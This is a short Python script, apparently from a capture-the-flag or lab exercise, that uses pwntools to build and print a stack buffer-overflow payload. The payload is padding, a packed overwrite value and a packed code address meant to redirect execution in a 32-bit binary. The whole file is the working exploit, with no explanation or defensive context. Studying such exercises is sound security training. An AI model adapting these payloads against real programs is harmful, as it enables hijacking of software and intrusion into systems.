from pwn import *
payload = ''.join([
    'A'*(0x10+8),
    p32(0xdeadc0de),
    'B'*((0x28-0x10-8-4)),
    p32(0x080484eb)
])
print(payload)